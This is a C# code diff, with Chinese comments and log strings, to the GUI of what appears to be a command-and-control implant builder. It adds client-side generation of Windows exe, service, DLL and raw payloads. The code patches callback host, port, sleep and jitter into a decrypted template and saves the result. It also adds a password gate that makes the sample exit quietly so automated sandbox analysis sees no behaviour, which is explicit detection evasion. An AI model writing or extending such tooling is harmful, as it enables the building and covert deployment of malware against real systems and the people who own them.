@@ -4153,6 +4153,13 @@ namespace CsdevGui
                                                 string outFile, long sleep, long jitter, bool noSleep,
                                                 string password)
         {
+            // 客户端本地生成: 原生格式(win2-exe/console/svc/dll/raw/tcp)直接在客户端
+            // 解密模板 + 覆写配置槽, 完全不走服务端、也不需要 gcc / PowerShell。
+            if (NativeGenerator.Supports(fmt))
+            {
+                return GenerateNativeLocally(fmt, host, port, ssl, outFile, sleep, jitter, password);
+            }
+
             // 请求体由 PayloadRequest.Build 构造 (纯函数, 字段名/省略规则有自测钉住)
             var body = PayloadRequest.Build(fmt, host, port, ssl, outFile, sleep, jitter, noSleep, password);
             using (var doc = await _api.BuildPayloadAsync(body))
@@ -4257,6 +4264,67 @@ namespace CsdevGui
                 GenLine("\u2718 生成失败" + (err.Length > 0 ? ": " + MaskPwd(err, password) : ""));
                 return false;
             }
+        }
+
+        /// <summary>
+        /// 客户端本地生成原生格式载荷: 解密内嵌模板 + 覆写配置槽, 产出字节直接落盘到本机。
+        ///
+        /// 与旧的服务端回传流程对等的三件事: 写日志(口令脱敏)、把 data 落到本机保存路径、
+        /// 更新状态栏。差别只有一点 —— 这里没有任何网络往返, 也不依赖服务端是否装 gcc。
+        /// </summary>
+        private bool GenerateNativeLocally(string fmt, string host, long port, bool ssl,
+                                           string outFile, long sleep, long jitter, string password)
+        {
+            var res = NativeGenerator.Generate(fmt, host, (int)port, ssl, "", (int)sleep, (int)jitter, "raw", password);
+
+            string shown = MaskPwd(res.Log ?? "", password);
+            if (!string.IsNullOrEmpty(shown))
+            {
+                foreach (string raw in shown.Split('\n'))
+                {
+                    GenLine(raw.TrimEnd('\r'));
+                }
+            }
+            if (res.Error != null)
+            {
+                GenLine("[stderr] " + res.Error);
+                GenLine("");
+                GenLine("\u2718 生成失败: " + MaskPwd(res.Error, password));
+                SetStatus("生成失败: " + res.Error);
+                return false;
+            }
+
+            string dest = outFile;
+            if (string.IsNullOrEmpty(dest))
+            {
+                dest = Path.Combine(_devRoot, "build", "payload", res.FileName);
+            }
+            try
+            {
+                string dir = Path.GetDirectoryName(dest);
+                if (!string.IsNullOrEmpty(dir)) Directory.CreateDirectory(dir);
+                File.WriteAllBytes(dest, res.Blob);
+            }
+            catch (Exception ex)
+            {
+                GenLine("[!] 保存到本机失败: " + ex.Message);
+                SetStatus("载荷已生成, 但保存到本机失败");
+                return false;
+            }
+
+            GenLine("");
+            GenLine("[+] 已保存到本机: " + dest);
+            GenLine("    " + res.Blob.Length + " 字节, sha256 " + (res.Sha256.Length >= 16 ? res.Sha256.Substring(0, 16) : res.Sha256));
+            if (!string.IsNullOrEmpty(password))
+            {
+                GenLine("    [口令门控] 已启用 — 启动时必须带口令参数, 例如: <样本> <你的口令>");
+                GenLine("               也可用环境变量 CSDEV_TOKEN=<口令> 启动");
+                GenLine("               直接双击/无参数运行会安静退出 (沙箱自动化检测看不到任何行为)");
+            }
+            GenLine("");
+            GenLine("\u2714 生成成功  " + Fmt.Size(res.Blob.Length));
+            SetStatus("生成成功: " + Path.GetFileName(dest) + "  " + Fmt.Size(res.Blob.Length));
+            return true;
         }
 
         /// <summary>
